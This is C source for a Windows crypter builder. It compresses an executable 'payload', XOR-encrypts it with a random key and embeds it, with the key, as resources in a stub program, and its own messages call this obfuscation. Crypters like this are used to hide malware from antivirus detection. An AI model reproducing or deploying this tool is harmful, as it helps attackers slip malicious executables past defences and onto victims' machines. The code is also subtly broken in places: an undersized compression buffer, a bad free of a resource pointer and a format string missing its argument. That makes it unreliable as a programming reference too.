/*

    Compresses and encrypts an executable payload
    Copyright (C) 2016  93aef0ce4dd141ece6f5

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
	along with this program. If not, see <http://www.gnu.org/licenses/>.

*/

#include <stdio.h>
#include <stdarg.h>
#include <windows.h>
#include <wincrypt.h>
#include <zlib.h>

#include "resource.h"

#define WIN32_LEAN_AND_MEAN
#define DEBUG
#define DEBUG_TITLE "STUB - DEBUG MESSAGE"

#define BUFFER_RSRC_ID 10
#define FILE_SIZE_RSRC_ID 20
#define KEY_RSRC_ID 30

#define KEY_LEN 64

typedef struct _FileStruct {
	PBYTE pBuffer;
	DWORD dwBufSize;
	DWORD dwFileSize;
	PBYTE pKey;
} FileStruct, *pFileStruct;

VOID Debug(LPCSTR fmt, ...) {
#ifdef DEBUG
	va_list args;

	va_start(args, fmt);
	vprintf(fmt, args);

	va_end(args);
#endif
}

FileStruct *LoadFile(LPCSTR szFileName) {
	Debug("Loading %s...\n", szFileName);

	Debug("Initializing struct...\n");
	FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
	if (fs == NULL) {
		Debug("Create %s file structure error: %lu\n", szFileName, GetLastError());
		return NULL;
	}

	Debug("Initializing file...\n");
	// get file handle to file
	HANDLE hFile = CreateFile(szFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		Debug("Create file error: %lu\n", GetLastError());
		free(fs);
		return NULL;
	}

	// get file size
	Debug("Retrieving file size...\n");
	fs->dwFileSize = GetFileSize(hFile, NULL);
	if (fs->dwFileSize == INVALID_FILE_SIZE) {
		Debug("Get file size error: %lu\n", GetLastError());
		CloseHandle(hFile);
		free(fs);
		return NULL;
	}
	fs->dwBufSize = fs->dwFileSize;

	// create heap buffer to hold file contents
	fs->pBuffer = (PBYTE)malloc(fs->dwFileSize);
	if (fs->pBuffer == NULL) {
		Debug("Create buffer error: %lu\n", GetLastError());
		CloseHandle(hFile);
		free(fs);
		return NULL;
	}

	// read file contents
	Debug("Reading file contents...\n");
	DWORD dwRead = 0;
	if (ReadFile(hFile, fs->pBuffer, fs->dwFileSize, &dwRead, NULL) == FALSE) {
		Debug("Read file error: %lu\n", GetLastError());
		CloseHandle(hFile);
		free(fs);
		return NULL;
	}
	Debug("Read 0x%08x bytes\n\n", dwRead);

	// clean up
	CloseHandle(hFile);

	return fs;
}

BOOL UpdateStub(LPCSTR szFileName, FileStruct *fs) {
	// start updating stub's resources
	HANDLE hUpdate = BeginUpdateResource(szFileName, FALSE);
	// add file as a resource to stub
	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(BUFFER_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs->pBuffer, fs->dwBufSize) == FALSE) {
		Debug("Update resource error: %lu\n", GetLastError());
		return FALSE;
	}

	// add file size as a resource to stub
	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(FILE_SIZE_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (PVOID)&fs->dwFileSize, sizeof(DWORD)) == FALSE) {
		Debug("Update resource error: %lu\n", GetLastError());
		return FALSE;
	}

	// add decryption key as a resource
	if (UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(KEY_RSRC_ID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), fs->pKey, KEY_LEN) == FALSE) {
		Debug("Update resource error: %lu\n", GetLastError());
		return FALSE;
	}

	EndUpdateResource(hUpdate, FALSE);

	return TRUE;
}

BOOL BuildStub(LPCSTR szFileName, FileStruct *fs) {
	Debug("Building stub: %s...\n", szFileName);

	// get stub program as a resource
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(1), "STUB");
	if (hRsrc == NULL) {
		Debug("Find stub resource error: %lu\n", GetLastError());
		return FALSE;
	}
	DWORD dwSize = SizeofResource(NULL, hRsrc);

	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		Debug("Load stub resource error: %lu\n", GetLastError());
		return FALSE;
	}

	// get stub's file content
	PBYTE pBuffer = (PBYTE)LockResource(hGlobal);
	if (pBuffer == NULL) {
		Debug("Lock stub resource error: %lu\n", GetLastError());
		return FALSE;
	}

	// create output file
	Debug("Creating stub...\n");
	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		Debug("Create stub error: %lu\n", GetLastError());
		free(pBuffer);
		return FALSE;	
	}

	// write stub content to output file
	Debug("Writing payload to stub...\n");
	DWORD dwWritten = 0;
	if (WriteFile(hFile, pBuffer, dwSize, &dwWritten, NULL) == FALSE) {
		Debug("Write payload to stub error: %lu\n", GetLastError());
		CloseHandle(hFile);
		free(pBuffer);
		return FALSE;
	}
	Debug("Wrote 0x%08x bytes\n\n");

	CloseHandle(hFile);

	// add payload to stub
	Debug("Updating stub with payload...\n");
	if (UpdateStub(szFileName, fs) == FALSE)
		return FALSE;

	return TRUE;
}

BOOL GenerateKey(FileStruct *fs) {
	fs->pKey = (PBYTE)malloc(KEY_LEN);
	if (fs->pKey == NULL) return FALSE;

	// initialize crypto service provider
	HCRYPTPROV hProv = NULL;
	if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, 0) == FALSE) {
		Debug("Crypt aquire context error: %lu\n", GetLastError());
		free(fs->pKey);
		return FALSE;
	}

	// generate secure bytes
	Debug("Generating cryptographically secure bytes...\n");
	if (CryptGenRandom(hProv, KEY_LEN, fs->pKey) == FALSE) {
		Debug("Generate random key error: %lu\n", GetLastError());
		free(fs->pKey);
		return FALSE;
	}
	Debug("Using key: ");
	for (int i = 0; i < KEY_LEN; i++)
		Debug("0x%02x ", fs->pKey[i]);
	Debug("\n");

	// clean up
	CryptReleaseContext(hProv, 0);

	return TRUE;
}

// XOR
BOOL EncryptPayload(FileStruct *fs) {
	Debug("EncryptPayloading payload...\n");

	Debug("Generating key...\n");
	if (GenerateKey(fs) == FALSE) return FALSE;

	for (DWORD i = 0; i < fs->dwBufSize; i++)
		fs->pBuffer[i] ^= fs->pKey[i % KEY_LEN];

	Debug("EncryptPayloadion routine complete\n");
	return TRUE;
}

BOOL CompressPayload(FileStruct *fs) {
	Debug("Compressing payload...\n");
	
	PBYTE pCompressedBuffer = (PBYTE)malloc(fs->dwBufSize);
	ULONG ulCompressedBufSize = compressBound((ULONG)fs->dwBufSize);
	compress(pCompressedBuffer, &ulCompressedBufSize, fs->pBuffer, fs->dwBufSize);

	fs->pBuffer = pCompressedBuffer;
	fs->dwBufSize = ulCompressedBufSize;

	Debug("Compression routine complete\n");
	return TRUE;
}

int main(int argc, char *argv[]) {
	printf("Copyright (C) 2016  93aef0ce4dd141ece6f5\n\n");
	if (argc < 3) {
		Debug("Usage: %s [INPUT FILE] [OUTPUT FILE]\n", argv[0]);
		return 1;
	}

	FileStruct *fs = LoadFile(argv[1]);
	if (fs == NULL) return 1;

	Debug("Applying obfuscation...\n");
	if (CompressPayload(fs) == FALSE) {
		free(fs);
		return 1;
	}

	if (EncryptPayload(fs) == FALSE) {
		free(fs);
		return 1;
	}
	Debug("\n");

	if (BuildStub(argv[2], fs) == FALSE) {
		free(fs->pKey);
		free(fs);
		return 1;
	}

	// clean up
	free(fs->pKey);
	free(fs);

	Debug("\nDone\n");

	return 0;
}